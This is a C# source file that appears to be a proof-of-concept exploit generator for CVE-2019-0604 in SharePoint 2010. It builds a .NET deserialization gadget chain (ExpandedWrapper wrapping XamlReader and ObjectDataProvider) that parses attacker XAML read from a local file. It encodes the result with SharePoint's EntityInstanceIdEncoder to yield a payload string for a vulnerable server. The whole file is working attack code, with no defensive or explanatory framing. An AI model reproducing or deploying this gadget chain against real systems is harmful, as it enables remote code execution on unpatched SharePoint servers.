using System.Data.Services.Internal;
using System.IO;
using System.Windows.Data;
using System.Windows.Markup;

namespace cve_2019_0604_SP2010_netv3._5
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Console.WriteLine(typeof(Microsoft.SharePoint.WebControls.ItemPickerDialog).AssemblyQualifiedName.ToString());
            //System.Console.ReadKey();



            object[] objs = new object[1];
            objs[0] = Payload();
            System.Console.WriteLine(Microsoft.SharePoint.BusinessData.Infrastructure.EntityInstanceIdEncoder.EncodeEntityInstanceId(objs));
            //System.Console.ReadKey();
        }

        public static object Payload()
        {
            ExpandedWrapper<XamlReader, ObjectDataProvider> eobj = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
            eobj.ProjectedProperty0 = new ObjectDataProvider();
            eobj.ProjectedProperty0.ObjectInstance = new XamlReader();
            eobj.ProjectedProperty0.MethodName = "Parse";
            eobj.ProjectedProperty0.MethodParameters.Add(File.ReadAllText("C:\\Do_Not_Scan\\Tools\\CVE-2019-0604-master\\t.xml"));
            return eobj;
        }
    }
}
